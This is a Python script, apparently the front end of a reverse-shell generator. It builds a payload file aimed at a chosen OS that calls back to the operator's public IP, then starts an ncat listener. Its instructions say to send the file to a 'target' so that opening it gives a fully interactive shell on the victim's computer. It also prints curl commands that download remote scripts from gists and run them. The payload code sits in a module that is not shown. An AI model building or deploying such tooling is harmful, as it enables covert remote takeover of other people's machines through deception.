import sys
import time
from core.network import get_public_ip, start_ncat_listener, check_ncat_installed
from core.system import install_nmap_windows, ssh_connect, is_admin
from core.generator import ShellGenerator
from utils.animations import loading_animation
from config import DEFAULT_PORT

def validate_port(port_str):
    try:
        port = int(port_str)
        if 1024 <= port <= 65535:
            return True
        print("Port must be between 1024 and 65535", file=sys.stderr)
        return False
    except ValueError:
        print("Invalid port number", file=sys.stderr)
        return False

def main():
    try:
        # Handle SSH connection if IP provided
        ipaddress = input("Enter IP Address to connect via SSH to (Hit Enter to use your own): ").strip()
        if ipaddress:
            print("""Run this script to execute the rest of the code:
            
            For MacOS and Linux: curl -s -O https://gist.githubusercontent.com/TheCozbrozYT/1e2503badad5d92ae9662e91a196d34d/raw/569cb934c78157adf2c0013927396d2a08895af5/unix-func.py && python3 handling.py
            
            For Windows: curl -s -O https://gist.githubusercontent.com/TheCozbrozYT/ef5b4daaa538f60c0a3039f1dc033dad/raw/0e02b4d88c64784fcdb1f635c6edf4a95470b5bd/win-func.py && python3 handling.py""")
            time.sleep(2)
            print("Now entering SSH! Remember to download the file to the right directory.")
            if not ssh_connect(ipaddress):
                return

        # Check for ncat installation
        if not check_ncat_installed():
            response = input("Ncat/Nmap is not installed. Would you like to install it? (y/n): ").lower()
            if response == 'y':
                if not is_admin():
                    print("Administrator privileges required to install nmap. Please run the script as administrator.", file=sys.stderr)
                    return
                print("Installing Nmap! This will restart the script. Please wait... ")
                if not install_nmap_windows():
                    return
            else:
                print("Ncat is required for this tool to work.", file=sys.stderr)
                return

        # Get target OS
        while True:
            target_os = input("Enter target OS (windows/macos/linux): ").lower()
            if target_os in ["windows", "macos", "linux"]:
                break
            print("Invalid OS. Please choose windows, macos, or linux.", file=sys.stderr)

        # Get and validate port
        while True:
            server_port = input(f"Enter listening port (default: {DEFAULT_PORT}): ").strip() or DEFAULT_PORT
            if validate_port(server_port):
                break

        # Get public IP
        public_ip = get_public_ip()
        if not public_ip:
            print("Failed to get public IP address. Please check your internet connection.", file=sys.stderr)
            return

        # Generate shell file
        generator = ShellGenerator(public_ip, server_port)
        loading_animation("Generating file! Please wait...")

        success = False
        if target_os in ["macos", "linux"]:
            success = generator.generate_unix_shell()
        elif target_os == "windows":
            success = generator.generate_windows_shell()

        if not success:
            print("Failed to generate shell file.", file=sys.stderr)
            return

        # Show instructions if requested
        end_prompt = input("File Generated! Press 1 and Enter for instructions or just Enter to continue: ")
        if end_prompt == "1":
            print("Send the generated file to your target. When they open it, it will spawn a fully interactive shell, acting as their computer.")
            print("The file can be found in the 'output' directory.")
            time.sleep(2)

        # Start listener
        if not start_ncat_listener(server_port):
            return

    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"An unexpected error occurred: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
